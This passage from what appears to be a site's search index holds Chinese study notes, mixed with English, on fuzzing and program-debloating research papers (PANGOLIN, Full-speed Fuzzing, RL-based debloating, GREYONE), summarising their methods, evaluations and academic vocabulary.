intuitively\u5e94\u8be5\u53ef\u4ee5\u8fd9\u4e48\u505a\uff1b\u4e4b\u540e\u4e3e\u4f8b\u5b50\uff1b\u6838\u5fc3\u7684\u4e24\u70b9\u2014\u2014\u7528\u591a\u8fb9\u5f62\u7684\u8def\u5f84\u7ea6\u675f\u628a\u79cd\u5b50\u53d8\u5f02\u8f6c\u6362\u6210\u5728\u4e00\u4e2a\u591a\u8fb9\u5f62\u5185\u53d6\u6837\u3001\u7528\u7ea6\u675f\u964d\u4f4e\u7ea6\u675f\u6c42\u89e3\u590d\u6742\u5ea6\u51cf\u5c0f\u53ef\u884c\u89e3\u7a7a\u95f4 \u4ece\u800c\u52a0\u901f\u7ea6\u675f\u6c42\u89e3\uff1b\u7136\u540e\u8bf4\u81ea\u5df1\u6d4b\u4e86\u4e00\u4e0b \u6548\u679c\u6bd4state of art\u597d10%~30%\u7684coverage\uff0c\u5728LAVA-M\u80fd\u591a\u53d1\u73b0500+bugs\uff0c\u53d1\u73b0\u65b0\u768441\u4e2abug \u62ff\u52308\u4e2aCVE \u968f\u673a\u53d8\u5f02\u7684\u7a7a\u95f4\u603b\u662f\u592a\u5927\u4e86 \u7ea6\u675f\u7684\u62bd\u8c61 \u6709 interval [32], octagon [33], and polyhedral [34]. \u90fd\u662fsound\u7684\uff08\u5305\u542b\u6240\u6709\u76ee\u6807\u70b9\uff09\uff0c\u4f46polyhedral\u6709\u6700\u597d\u7684precision \u5305\u542b\u6700\u5c11\u7684\u975e\u76ee\u6807\u70b9 \u91c7\u6837\u7528Dikin walk algorithm \u80fd\u4fdd\u8bc1\u5747\u5300\u91c7\u6837 \u4fdd\u8bc1\u591a\u6837\u6027\uff1a\u6bcf\u4e24\u4e2a\u91c7\u6837\u4e4b\u95f4\u7684\u8ddd\u79bb\u90fd\u8981\u5927\u4e8e\u4e00\u4e2a\u52a8\u6001\u8fb9\u754c \u5177\u4f53\u505a\u6cd5\u5e76\u4e0d\u76f2\u76ee\u8ba1\u7b97x+y\u548cx-y\uff0c\u800c\u662f\u52a0\u5165\u7ea6\u675f\u4e2d\u7684\u7ebf\u6027\u8868\u8fbe\u5f0f \u59825x+y \u5e94\u8be5\u91c7\u591a\u5c11\u6837\u672c\uff1f\u8d8a\u96becover\u7684\u9700\u8981\u8d8a\u591a\uff0c\u8d8a\u591a\u4f9d\u8d56\u5b83\u7684\u8def\u5f84\u9700\u8981\u8d8a\u591a evaluation \u4e09\u4e2aRQ\u7814\u7a76\u95ee\u9898\uff1a1. \u6bd4\u73b0\u5728\u6700\u597d\u7684fuzzer\u80fd\u4e0d\u80fd\u53d1\u73b0\u66f4\u591a\u7684bug\uff1b2.\u80fd\u4e0d\u80fd\u66f4\u9ad8\u7684coverage\uff1b3. \u53d8\u5f02\u65b9\u6cd5\u7684\u6709\u6548\u6027 \u5b9e\u9a8c\u7528\u4e86\u4e24\u4e2aafl\uff0cangora\u6709-j 2\uff0c\u4f46T-Fuzz\u4e0d\u652f\u6301 \u4e5f\u5c31\u76f4\u63a5\u8dd1\u4e86 \u9009seed\u7684\u65b9\u5f0f\uff1a\u7528AFL\u63d0\u4f9b\u7684seed\uff0c\u7528\u4eba\u5bb6\u4ee3\u7801\u91cc\u81ea\u5e26\u7684\u6d4b\u8bd5\u6837\u4f8b \u91cd\u590d10\u6b21 \u6bd4\u8f83\u4e86\u6548\u679c\u597d\u4e4b\u540e\u8ba8\u8bba\u4e3a\u5565\u6ca1\u80fd\u53d1\u73b0LAVA-M\u7684\u6240\u6709bug\uff1f\u8bf4\u8fd9\u662fQSYM\u7684\u95ee\u9898 \u7f3a\u5c11\u5bf9\u5e95\u5c42\u7cfb\u7edf\u8c03\u7528\u7684\u5efa\u6a21\u5982who\u7528\u7684x2nrealloc\uff0c\u4e0d\u652f\u6301\u6d6e\u70b9\u6570\u7ea6\u675f\u3002\u4f46\u662f\u8fd9\u4e9b\u9650\u5236\u4e0d\u662f\u8fd9\u7bc7work\u8981\u89e3\u51b3\u7684\u95ee\u9898\uff0cand we leave them as our future work. crash\u53bb\u91cd\u7528\u7684 afl-cmin -C \u53d1\u73b0\u4e86T-Fuzz\u5bf9\u5927\u7a0b\u5e8f\u6709scalability issues \u6240\u4ee5\u5c31\u6ca1\u6709\u6bd4\u8f83coverage \u6bd4QSYM\u597d\uff0c\u539f\u56e0\u662fqsym\u5bf9\u6bcf\u4e2abranch\u53ea\u751f\u6210\u4e00\u4e2aseed\uff0c\u8fd9\u6837\u4f1a\u6f0f\u6389\u4e00\u4e9b\u2014\u2014\u8986\u76d6\u5230\u4e00\u4e2abranch\u5e76\u4e0d\u610f\u5473\u7740\u5c31\u80fd\u89e6\u53d1\u6f0f\u6d1e The performance of constrained mutation\uff1a\u6bd4\u8f83\u63d0\u51fa\u7684constrained mutation\u548cSMTSampler \u770b\u7ed9\u5b9atime buget\u5206\u522b3s 5s 10s\u7684\u60c5\u51b5\u4e0b\u80fd\u89e3\u51fa\u591a\u5c11 \u8ba1\u7b97\u5e73\u5747\u65f6\u95f4\u7684\u65f6\u5019\u5982\u679c\u4e0d\u80fd\u89e3\u51b3\u5c31\u6309\u4e0a\u9650\u2014\u2014\u8d85\u8fc795%\u7684\u7ea6\u675f\u90fd\u80fd\u57283\u79d2\u949f\u5185\u641e\u5b9a\u3002\u603b\u4e4b\uff0c\u6211\u4eec\u7684\u65b9\u6cd5\u6bd4SMTSampler\u6548\u7387\u548c\u6709\u6548\u6027\u90fd\u5f3a \u4e3a\u5565\u5462\uff1f\u51cf\u5c11\u4e86\u7ea6\u675f\u6c42\u89e3\u5668\u7684\u8c03\u7528\u3001\u4fdd\u8bc1\u4e86\u5747\u5300\u5206\u5e03 related work \u79cd\u5b50\u7684\u4f18\u5148\u9009\u62e9\u548c\u8c03\u5ea6 \u662f\u57fa\u4e8e\u7a0b\u5e8f\u7ed3\u6784\u7684 \u5ffd\u89c6\u4e86\u8f93\u5165\u7684\u5b9e\u9645\u53d6\u503c\u7a7a\u95f4 \u76f8\u6bd4\u4e8eKLEE\u7f13\u5b58\u4e86constraint\uff0c\u6211\u4eec\u7f13\u5b58\u4e86\u539f\u59cb\u8def\u5f84\u7ea6\u675f\u7684\u7b80\u5316\u5f62\u5f0f path abstraction \u5982\u4f55\u6709\u6548\u7684\u5c06concolic execution\u548cfuzzing\u7ed3\u5408is always under consideration \u5c3d\u7ba1\u6709\u5185\u5b58\u5feb\u7167\u7684\u6280\u672f\u6765\u4fdd\u5b58\u7a0b\u5e8f\u72b6\u6001[7] \u201cUnleashing mayhem on binary code\u201d\uff0c\u4f46\u5bf9hybrid fuzzing\u6765\u8bf4\u592a\u6162\u4e86","title":"PANGOLIN: Incremental Hybrid Fuzzing with Polyhedral Path Abstraction"},{"location":"PaperReading/#full-speed-fuzzing-reducing-fuzzing-overhead","text":"\u4e00\u53e5\u8bdd\u6982\u62ec\uff1a \u6bcf\u4e2a\u57fa\u672c\u5757\u7b2c\u4e00\u4e2a\u5b57\u8282\u6539\u6210CC\u89e6\u53d1\u4e2d\u65ad\uff0c\u4e0d\u9700\u8981\u8017\u65f6\u5730\u8bb0\u5f55coverage\u4e86\uff0c\u53d1\u73b0\u65b0\u7684\u57fa\u672c\u5757\u5c31\u80fd\u81ea\u52a8\u77e5\u9053 \u5355\u8bcd\uff1a tracking apparatuse\u63d2\u6869\u4ee3\u7801\u505a\u7684\u4e8b\u60c5 niche \u5408\u5b9c\u7684\u5c0f\u73af\u5883 \u8fd9\u91cc\u4f3c\u4e4e\u662f\u53d7\u9650\u7684\u610f\u601d As applications of directed fuzzing are generally niche, such as taint tracking [16] or patch testing [31], coverage-guided fuzzing\u2019s wider scope makes it more popular among the fuzzing community [5], [6], [4], [3]. narrow \u533a\u522b\u4e0d\u5927 results in Section VI suggest that the performance gap is much narrower. convincingly \u6bd4\u5176\u4ed6\u4eba\u597d A12 excceds 0.71 performance-taxing \u8017\u65f6 per-variant geometric mean\u5206\u7ec4\u8ba1\u7b97\u5747\u503c deficit \u5f15\u5165\u7684overhead: \u2026 far outweighs the performance deficit from trimming and calibration tracing is not a technical challenge \u6ca1\u505a\u7684\u4e1c\u897fclaim\u4e0d\u96be\u505a graciously \u611f\u8c22\u5176\u4ed6\u4eba \u4eba\u5bb6\u7684idea\uff1a \u628a\u7a0b\u5e8f\u53d8\u6210\u4e00\u4e2a\u80fd\u81ea\u5df1\u62a5\u544a\u6709\u6ca1\u6709\u53d1\u73b0\u65b0\u7684basic block\u7684\u2014\u2014\u5728\u6bcf\u4e2a\u57fa\u672c\u5757\u5f00\u5934\u53d8\u62100xCC\uff08encode the current frontier\uff09\uff0c\u89e6\u53d1\u4e86\u4e2d\u65ad\u8bf4\u660e\u6709\u65b0\u7684\u8986\u76d6\u7387\uff0c\u9700\u8981\u505c\u4e0bfork server\u53bb\u6389\u8fd9\u4e2a\u4e2d\u65ad\u518d\u7ee7\u7eed\u8dd1 \u505acoverage-guided tracing \u4eba\u5bb6\u7684\u5b9e\u9a8c\u5176\u5b9e\u4e0d\u662f\u5728\u505afuzzing\uff0c\u800c\u662f\u5148\u8dd1afl-qemu\u6536\u96c624\u5c0f\u65f6\u6240\u6709\u751f\u6210\u7684seed\uff085\u4e2a\u4e0d\u540c\u7684test case datasets\uff09\uff0c\u518d\u6539\u4e86afl\u53ea\u8dd1run_target\uff0c\u770b\u4e0d\u540c\u7684\u8bbe\u8ba1\u4e0b\u8017\u65f6\u7684\u533a\u522b \u53bb\u6389\u566a\u97f3\u7528\u7684trimmed-mean denoising \u53bb\u6389\u6700\u5927\u6700\u5c0f33% \u5b9e\u9a8c\u662f5\u4e2adataset,\u6bcf\u4e2a\u91cd\u590d8\u6b21 \u57fa\u4e8eafl-dyninst\u5b9e\u73b0\uff0c\u4f46\u662f\u8fd9\u73a9\u610f\u6027\u80fd\u4e0d\u884c \u6240\u4ee5\u8dd1\u7684oracle\u7a0b\u5e8ffork server\u8fd8\u662f\u7528afl-as\u63d2\u7684 \u5728tracer\u8bb0\u5f55\u5757\u7684\u8986\u76d6\u7387\u7684\u65f6\u5019\uff0c\u4e00\u4e2a\u5757\u53ef\u80fd\u6267\u884c\u591a\u6b21\u5f88\u5927\u7684overhead\uff0c\u4e8e\u662f\u641e\u4e86\u4e2a\u5168\u5c40\u7684hashmap\uff0c\u548cfork server\u5171\u4eab \u4e4b\u540e\u7684\u8fdb\u7a0b\u5c31\u77e5\u9053\u54ea\u4e9b\u624d\u662funique-covered basic blocks \u4e0d\u61c2\u7684\u5730\u65b9\uff1a\u4e3a\u5565\u4f1a\u5c1d\u8bd5\u5bf9\u540c\u4e00\u4e2a\u5730\u65b9\u591a\u6b21unmodify? We observe that even coverage-increasing test cases often have significant overlaps in coverage. This causes UnTracer to attempt unmodifying many already-unmodified basic blocks, resulting in high overhead. \u9009\u62e9\u7684fuzz\u6587\u4ef6\u7c7b\u578b\uff1adev\u5f00\u53d1\uff0c\u56fe\u7247\uff0c\u538b\u7f29data archiving\uff0c\u7f51\u7edcnetwork utilities\uff0c\u97f3\u9891\uff0c\u6587\u6863\uff0c\u5bc6\u7801\u5b66cryptography\uff0cweb\u5f00\u53d1 timeout\u4e5f\u662f\u4e00\u4e2a\u5f88\u91cd\u8981\u7684\u56e0\u7d20 \u5982\u679ctimeout\u7684\u6587\u4ef6\u592a\u591a \u4f5c\u8005\u7684\u4f18\u52bf\u5c31\u4e0d\u660e\u663e\u4e86\uff1b\u5b9e\u9a8c\u8bbe\u7f6e\u4e3a500ms\u7684\u8d85\u65f6 \u6bd4\u8f83\u7684baseline: \u53eafork server\u4e0d\u8fdb\u884c\u4efb\u4f55\u63d2\u6869\uff0c\u8fd9\u662f\u6700\u5feb\u7684 overhead\u662f\u76f8\u5bf9\u4e8e\u8fd9\u4e2abaseline\u800c\u8a00\u7684 \u540e\u7eed\u8981\u4e86\u89e3\u7684\uff1a Intel PT\u786c\u4ef6\u8f85\u52a9[11],[4],[12]\u7684\u8986\u76d6\u7387 overhead\u66f4\u5c0f\uff0c\u7f3a\u70b9\uff1a\u9700\u8981\u4e00\u4e2a\u652f\u6301\u7684CPU\uff0c\u89e3\u7801CFG\u65e5\u5fd7\u8017\u65f6\uff0c\u53ea\u652f\u6301x86 Xuwen\u7684\u4f18\u5316\u64cd\u4f5c\u7cfb\u7edf\u7684\u7cfb\u7edf\u8c03\u7528[61] fuzzer-agnostic operating primitives \u7a0b\u5e8f\u6539\u5199AFL-lafIntel [70] unrolls magic bytes into single comparisons at compile-time, but currently only supports white-box binaries. \u4e09\u79cd\u8986\u76d6\u7387\u7684\u8ba1\u7b97\u65b9\u5f0f\uff1a\u57fa\u672c\u5757\uff0c\u8fb9\uff0cbasic block path\u8fd9\u4e00\u79cd\u6ca1\u4eba\u505a \u53ea\u8bb0\u5f55basic block\u6765\u63a8\u65ad\u8fb9\u7684\u4fe1\u606f\uff0c\u662f\u6709\u95ee\u9898\u7684\uff1a\u5b58\u5728critical edges\u5c31\u4e0d\u51c6\u786e\uff0c\u9700\u8981\u5148\u53bb\u6389critical edges\u624d\u884c \u5c31\u662f\u7a7a\u7684else\u4e5f\u8981\u5f53\u6210\u4e00\u4e2a\u5757 \u5426\u5219\u4f1a\u9519\u8bef\u5730\u4e22\u6389\u4e00\u4e9b\u53d1\u73b0\u4e86\u65b0\u8986\u76d6\u7387\u7684\u79cd\u5b50 erroneously discard coverage-increasing inputs.\uff08\u53ef\u80fdafl\u5bf9for\u7684\u652f\u6301\u5c31\u662f\u8fd9\u4e2abug afl\u7684queue\u91cc\u7684\u6587\u4ef6\u6709+cov\u7684\u624d\u662f\u53d1\u73b0\u4e86\u65b0\u7684\u8986\u76d6\u7387\u7684 \u5f71\u54cdafl\u53d8\u5f02\u4f18\u5148\u7b56\u7565\u7684\u9664\u4e86coverage\u8fd8\u6709\u6587\u4ef6\u5927\u5c0f\uff0c\u76f8\u540c\u8986\u76d6\u7387\u4f18\u5148\u7528\u5c0f\u7684seed p-value\u5c0f\u4e8e0.05\u8981\u8bf4(pair-wise) hybrid\u7684fuzzer\u82b1\u66f4\u591a\u7684\u65f6\u95f4\u53d8\u5f02 \u5982QSYM","title":"Full speed Fuzzing: Reducing Fuzzing Overhead"},{"location":"PaperReading/#effective-program-debloating-via-reinforcement-learning","text":"CCS18 PDF \u6982\u62ec\uff1a\u628a\u673a\u5668\u5b66\u4e60\u7528\u5230Program Debloating\uff0c\u57fa\u672c\u65b9\u6cd5\u662f\u53cd\u590d\u5207\u7247\u53bb\u6389\uff0c\u7528Reinforcement Learning\u6765\u51cf\u5c11\u7f16\u8bd1\u6d4b\u8bd5\u7684\u6b21\u6570 \u5355\u8bcd seldom if ever used by average users \u4e00\u822c\u7528\u6237\u4e0d\u4f1a\u7528 has led to its sparing use \u5bfc\u81f4\u6ca1\u4eba\u7528 has been shown to suffice in the literature on \u2026 \u8bba\u6587\u4e2d\u5df2\u7ecf\u63d0\u5230 mangle \u641e\u4e71\u7a0b\u5e8f sacrifice efficiency \u8bf4\u522b\u4eba\u7684\u4e0d\u8db3\u7684\u65f6\u5019\u8bf4\u727a\u7272\u4e86xxx tailored to C/C++ \u53ea\u9002\u5408xxx myopic \u77ed\u89c6\u7684 Since the rules are myopic, C-Reduce generates a significant number of syntactically invalid candidates albeit \u4f46\u662f albeit due to a different reason. presuming a general setting where such an analysis may not be available \u4e3e\u7684\u4f8b\u5b50\u53ef\u4ee5\u5f88\u7b80\u5355\u9759\u6001\u5206\u6790\u51fa\u6765\uff0c\u8bf4\u4e00\u822c\u7684\u60c5\u51b5\u4e0b\u9759\u6001\u5206\u6790\u6ca1\u7528 akin to \u2026 \u548cxxx\u76f8\u540c \u63d2\u5165\u8bed because it not only avoids syntactic errors, akin to Perses, but it also learns to avoid semantic errors. Overall \u4e00\u6bb5\u8bdd\u7ed3\u675f\u7684\u65f6\u5019\u603b\u7ed3 large boilerplate code \u4e00\u5927\u6bb5\u4ee3\u7801 heed to \u9075\u5b88 C-Reduce does not heed to common software engineering practices such as modularity and locality suffices in practice\u5b9e\u9645\u4e0a\u662f\u5426\u8db3\u591f The reader may wonder whether a naive approach to program reduction based on runtime code coverage suffices in practice. empirically comfirmed \u9a8c\u8bc1\u9c81\u68d2\u6027\u53ea\u80fd\u7ecf\u9a8c\u6027\u5730\u9a8c\u8bc1 in this regard \u5728\u8fd9\u4e2a\u65b9\u9762 We can mitigate the issue by combining the results of multiple static analyzers that possess different capabilities in this regard. idea \u7a0b\u5e8f\u7684\u5e93\u548c one - size - fits - all\u7684\u5f00\u53d1\u65b9\u5f0f\u5bfc\u81f4\u4e86\u5927\u91cf\u5f88\u5c11\u7528 / \u6ca1\u7528\u7684\u4ee3\u7801 \u524d\u4eba\u7684\u505a\u6cd5\u6ca1\u8003\u8651\u8bed\u4e49\u4f9d\u8d56 \u5bfc\u81f4\u672a\u521d\u59cb\u5316\u53d8\u91cf\u7b49\u8bed\u4e49\u9519\u8bef unaware of semantic dependencies between program elements ( e . g . , def - use relations of variables debloating \u901a\u8fc7 delta debugging \u4e00\u6b65\u6b65\u53bb\u6389\u7a0b\u5e8f\u4e2d\u80fd\u5220\u7684\u7247\u6bb5\uff0c\u7528\u5f3a\u5316\u5b66\u4e60\u52a0\u901f\uff08\u51b3\u7b56\u6811 \u9a6c\u5c14\u79d1\u592b\u51b3\u7b56\u8fc7\u7a0b\uff09\uff0c\u4fdd\u8bc1\u80fd\u8fc7\u6d4b\u8bd5 high - level specification \uff0c\u6700\u540e\u5f97\u5230\u7684\u4e8c\u8fdb\u5236\u4efb\u4f55\u4e00\u4e2a\u7247\u6bb5\u90fd\u4e0d\u80fd\u518d\u5220\uff08 1 - minimality \uff09 \u8fd9\u4e2a\u65b9\u6cd5\u80fd\u6269\u5c55\u5230\u5927\u7a0b\u5e8f\uff0c\u907f\u514d\u73b0\u6709\u5de5\u5177\u8d85\u65f6\u7684\u95ee\u9898 \u8fd9\u4e2a\u65b9\u6cd5\u8fd8\u53ef\u4ee5\u964d\u4f4e\u653b\u51fb\u9762 \u53bb\u6389\u53ef\u9009\u529f\u80fd\u4e2d\u7684\u6f0f\u6d1e\uff0c\u51cf\u5c11 ROP gadget \u60f3\u505a\u5230\u4e94\u70b9\uff1a \u6700\u5c0f\uff1b\u8017\u65f6\u77ed\uff1b\u9c81\u68d2\u4e0d\u5f15\u5165\u65b0\u7684\u6f0f\u6d1e\uff1b\u751f\u6210\u7684\u4ee3\u7801\u53ef\u7ef4\u62a4\u53ef\u6269\u5c55\uff1b\u901a\u7528 \u6bd4\u9759\u6001\u5206\u6790\u52a8\u6001coverage\u7684\u90fd\u5c0f\uff1b\u5176\u4ed6\u4eba\u8d85\u65f6\u6211\u4eec\u90fd\u884c\uff1b\u7528\u9759\u6001\u5206\u6790\u5de5\u5177\u548cAFL\u6d4b3\u5929\u53ef\u4ee5\u53cd\u9988loop\uff1b\u4fdd\u7559\u4e86modularity and locality\uff1b\u65b9\u6cd5\u901a\u7528 \u548c\u7f16\u7a0b\u8bed\u8a00\u3001\u89c4\u8303\u65e0\u5173 \u89c4\u8303\u5c31\u662f\u6d4b\u8bd5\u4ee3\u7801 \u8f93\u5165\u4e00\u4e2a\u88c1\u526a\u540e\u7684\u4ee3\u7801 \u8f93\u51fa\u80fd\u5426\u6ee1\u8db3\uff1a \u80fd\u8fc7\u7f16\u8bd1\uff1b\u9700\u8981\u7684\u529f\u80fd\u6b63\u5e38\uff1b\u4e0d\u9700\u8981\u7684\u529f\u80fd\u81f3\u5c11\u4e0d\u80fd\u5d29\uff08\u6d4b\u8bd5\u6837\u4f8b\u6765\u81ea\u56de\u5f52\u6d4b\u8bd5\uff09\uff1b\u8981\u4f7f\u7528sanitizer\u786e\u4fdd\u6ca1\u6709\u672a\u5b9a\u4e49\u884c\u4e3a \u9a6c\u5c14\u79d1\u592b\u51b3\u7b56\u8fc7\u7a0b MDP \u57fa\u4e8e\u6a21\u578b\u7684\u5f3a\u5316\u5b66\u4e60 MBRL \u5728\u6a21\u578b\u7684\u5e2e\u52a9\u4e0b\u89e3\u51b3MDP\u95ee\u9898\uff0c\u5b66\u51fa\u8f6c\u6362\u7684\u6982\u7387\u548c\u5956\u8d4f\uff0c\u5f97\u5230\u53ef\u4ee5\u6700\u5927\u5316\u6536\u76ca\u548c\u7684\u52a8\u4f5c \u65b9\u6cd5\uff1a\u6267\u884c\u8fc7\u7a0b\u4f1a\u66f4\u65b0\u51b3\u7b56\u6811 \u7a0b\u5e8f\u7684\u7f16\u7801\u5c31\u662f\u7a0b\u5e8fn\u4efd \u6bcf\u4e00\u4efd\u662f\u5426\u5b58\u5728 \u4e00\u5f00\u59cb\u5c31\u662fn\u4e2a1 \u5177\u4f53\u5b9e\u73b0\u7684\u65f6\u5019\u662f\u5148\u5220global-level\u7684\u7ec4\u4ef6 \u5982\u5168\u5c40\u53d8\u91cf\u58f0\u660e\u3001\u7c7b\u522b\u5b9a\u4e49\u3001\u51fd\u6570\u5b9a\u4e49\uff0c\u518d\u5220\u5c40\u90e8\u7c7b\u522b\u7684\u7ec4\u4ef6 \u8d4b\u503c\u3001if\u8bed\u53e5\u3001while\u8bed\u53e5\uff0c\u7136\u540e\u7ee7\u7eedglobal local \u2026\u8fed\u4ee3\u5230\u7a33\u5b9a \u4f7f\u7528\u7b80\u5355\u7684\u4f9d\u8d56\u5206\u6790\u6765\u62d2\u7edd\u4e0d\u53ef\u80fd\u7684\u7a0b\u5e8f \u5982\u6ca1\u6709main \u7f3a\u5931\u53d8\u91cf\u5b9a\u4e49 \u53d8\u91cf\u6ca1\u521d\u59cb\u5316 \u6ca1\u6709return\u8bed\u53e5 \u51b3\u7b56\u6811\u7528\u7684FastDT\uff0c\u7528\u7684exact decision trees\u6ca1\u6709boosting bagging \u8ba1\u7b97\u4ee3\u7801\u884c\u6570\u4e4b\u524d\u8981\u5148\u5b8f\u5c55\u5f00 Evaluation \u9009\u4e8610\u4e2abinutils\u91cc\u7684\u7a0b\u5e8f\uff0c\u90fd\u5728busybox\u91cc \u53ef\u4ee5\u76f4\u63a5\u6bd4\u8f83 \u907f\u514d\u4ea7\u751f\u6b7b\u5faa\u73af\u7684\u7a0b\u5e8f \u8bbe\u7f6e\u4e86\u4e0d\u540c\u7684timeout 0.01~1s \u753b\u56fe\u5dee\u5f02\u592a\u5927\u53ef\u4ee5\u622a\u65ad \u9876\u90e8\u663e\u793a\u6570\u503c \u6709\u4e9bCVE\u6ca1\u80fd\u5220\u6389 \u8bf4\u8fd9\u4e9b\u5728\u6838\u5fc3\u529f\u80fd\u91cc\u9762 \u4e0d\u80fd\u7b80\u5355\u5220\u6389 \u5982\u6761\u4ef6\u7ade\u4e89 \u4ea7\u751f\u7684\u4ee3\u7801\u4f7f\u9759\u6001\u5206\u6790\u5de5\u5177\u7684\u62a5\u544a\u51cf\u5c11\u4e8695.4% \u62a5\u544a\u5c31\u80fd\u770b\u4e86 The decreased size and complexity of the reduced programs also enable to apply more precise program checkers such as static analyzers. \u7136\u540e\u4eba\u5de5\u68c0\u67e5\u8bf4\u90fd\u662f\u8bef\u62a5 feedback process \u8dd1AFL\u7684\u65f6\u5019\u5d29\u4e86 \u53d1\u73b0\u662f\u7f55\u89c1\u7684\u60c5\u51b5 \u628a\u8fd9\u79cd\u6d4b\u8bd5\u7528\u4f8b\u8003\u8651\u8fdb\u53bb\u540e\u91cd\u65b0\u751f\u6210 \u518dfuzzing\u5c313\u5929\u90fd\u4e0d\u5d29\u4e86This simple feedback process effectively improved the robustness of the resulting program THREATS TO VALIDITY \u6d4b\u8bd5\u811a\u672c\u884c\u4e3a\u7684\u4e0d\u786e\u5b9a\u6027\uff1a\u7528sanitizer\u7f13\u89e3\uff0c\u4f9d\u8d56\u7684\u5176\u4ed6\u5e93\u4ee3\u7801\u9700\u8981\u4e5f\u7528\u540c\u6837\u7684\u7f16\u8bd1\uff1btimeout\u673a\u5236\u5f15\u5165\u7684\u8bef\u62a5\uff0c\u53ef\u4ee5\u6539\u53d8\u68c0\u6d4b\u6b7b\u5faa\u73af\u7684\u673a\u5236[20] \u4e0d\u4f9d\u8d56timeout \u6d4b\u8bd5\u6837\u4f8b\u4e0d\u5b8c\u6574may not be exhaustive enough \u4f7f\u7528\u57fa\u4e8e\u8bed\u6cd5\u7684fuzzer \u9759\u6001\u5206\u6790\u5de5\u5177\u7684unsoundness \u4e0d\u652f\u6301\u590d\u6742\u7684\u7279\u6027 \u5982\u590d\u6742\u7684\u6307\u9488\u7b97\u672f\u8ba1\u7b97\uff0c\u672a\u77e5\u8bed\u4e49\u7684API\u8c03\u7528\u5bfc\u81f4\u7684\u590d\u6742\u63a7\u5236\u6d41\u2014\u2014\u7ed3\u5408\u591a\u79cd\u9759\u6001\u5206\u6790\u5de5\u5177 \u66f4\u591a\u65b9\u5411 program reasoning \u60f3\u77e5\u9053\u662f\u5426\u5f15\u5165\u4e86\u65b0\u7684bug\uff0c\u5305\u62ec\u9759\u6001\u5206\u6790 \u52a8\u6001\u5206\u6790 fuzzing \u8fd0\u884c\u65f6\u76d1\u63a7 \u9a8c\u8bc1 \u9759\u6001\u5206\u6790\u5de5\u5177\uff1aSparrow [13]\u2014a static analyzer for finding security bugs \u53ef\u4ee5\u68c0\u6d4bbug\uff0c\u8fd8\u80fd\u79fb\u9664\u4e0d\u53ef\u8fbe\u4ee3\u7801 \u7a0b\u5e8fdebloating \u7c97\u7c92\u5ea6\u7684Docker\u5927\u5bb9\u5668\u62c6\u89e3\u6210\u591a\u4e2a\u5c0f\u5bb9\u5668 \u9700\u8981\u52a8\u6001\u5206\u6790\u5e94\u7528\u884c\u4e3a[35] \u66f4\u7ec6\u7c92\u5ea6\u7684\u6709\u505aJava [28]\u548cAndroid [27]\u5e94\u7528\u7684 \uff1b\u6709\u907f\u514d\u8f7d\u5165\u4e0d\u4f1a\u7528\u5230\u7684\u51fd\u6570\u7684[34] \uff08\u51fd\u6570\u7ea7\u522b\u7684\u4f9d\u8d56\u5206\u6790\uff09 \u53e6\u4e00\u4e2a\u6b63\u4ea4\u7684\u65b9\u5411\uff1a\u68c0\u6d4b\u548c\u51cf\u5c11\u8fd0\u884c\u65f6\u5185\u5b58\u81a8\u80c0 [9,33,40-43] \u8f93\u5165\u6837\u4f8b\u7684\u6700\u5c0f\u5316 \u573a\u666f\u662f\u6d4b\u8bd5\u7f16\u8bd1\u5668/\u89e3\u91ca\u5668\uff0c\u4ea7\u751f\u80fdcrash\u7684\u66f4\u5c0f\u7684\u7a0b\u5e8f \u4e0d\u8003\u8651\u5b89\u5168\u6027\u53ef\u8bfb\u6027 \u6709\u5de5\u4f5c\u8003\u8651\u4e86\u8bed\u6cd5\u7684\u6b63\u786e\u6027[23,32,37] \u4f46\u6ca1\u8003\u8651\u8bed\u4e49\u6b63\u786e\u6027 Program slicing \u6307\u5b9a\u4e00\u4e2a\u4f4d\u7f6e\u63d0\u53d6\u7a0b\u5e8f\u7684\u4e00\u5c0f\u90e8\u5206 \u9700\u8981\u6307\u5b9a\u8bed\u4e49\u548c\u4f9d\u8d56\u5173\u7cfb\uff08challenging\uff09\uff0c\u4e5f\u53ef\u80fd\u4e0d\u80fd\u53bb\u6389\u6f0f\u6d1e \uff08\u8fd9\u7bc7\u6587\u7ae0\u7684\u65b9\u6cd5\u66f4\u597d\uff09 \u9759\u6001\u53ef\u8fbe\u6027\u5206\u6790 \u4e0d\u80fd\u5904\u7406\u590d\u6742\u7684\u63a7\u5236\u6d41\u5982\u95f4\u63a5\u8c03\u7528\u3001\u590d\u6742\u6761\u4ef6\u548c\u6307\u9488\u7b97\u672f \u52a8\u6001\u53ef\u8fbe\u6027\u5206\u6790 \u8fd9\u7bc7\u6587\u7ae0\u7684\u65b9\u6cd5\u66f4\u597d future work: more expressive probabilistic models with efficient incremental learning, designing various forms of specification other than input-output examples, applying to debloat programs written in arbitrary languages such as binary.","title":"Effective Program Debloating via Reinforcement Learning"},{"location":"PaperReading/#greyone-data-flow-sensitive-fuzzing","text":"USENIX20 PDF \u5355\u8bcd: is labor-intensive and requires lots of manual efforts \u9700\u8981\u4eba\u5de5 Head-to-Head Comparison \u6bd4\u8f83\u4e0d\u540c\u7684work to draw conclusions as objective as possible \u5c3d\u53ef\u80fd\u5ba2\u89c2 \u9009\u88ab\u6d4b\u7a0b\u5e8f\u7684\u539f\u56e0 We chose target applications considering several factors, including popularity, frequency of being tested, development activeness, and functionality diversity. \u9009\u51fa\u6765\u7684\u7c7b\u522b\u5305\u542b graphics processing libraries (e.g., libcaca and libsixel), shipping with \u7528afl-cmin\u7684\u65f6\u5019\u8bf4the tool afl-cmin shipping with AFL \u786e\u5b9afuzzing\u7684\u65f6\u95f4 we test target applications for more time, until the fuzzers reach a relatively stable state (i.e., the order of fuzzers\u2019 performance does not change anymore). Experiments showed that the fuzzers will get stable after testing these applications for 60 hours. So, we tested each application for 60 hours in our experiment. \u9664\u4e86\u7ed9\u5e73\u5747\u7ed3\u679c \u4e5f\u7ed9\u51famaxinum number a steady and stronger growth trend \u5927\u90e8\u5206\u65b9\u9762\u90fd\u66f4\u5feb in a faster pace than QSYM in most subjects idea: \u4f7f\u7528\u8f7b\u91cf\u7ea7fuzzing-driven taint inference FTI \u6709\u4e86taint\u4e4b\u540e\u7528\u8f93\u5165\u4f18\u5148\u6a21\u578b\u5224\u65ad\u5148\u63a2\u7d22\u54ea\u4e2a\u8def\u5f84 \u53d8\u5f02\u54ea\u4e9b\u5b57\u8282 \u600e\u4e48\u53d8\u5f02 \u5f3a\u8c03dataflow features\uff1a constraint conformance \u53d8\u91cf\u7684\u503c\u4e0e\u9884\u671f\u503c\u7684\u8ddd\u79bb 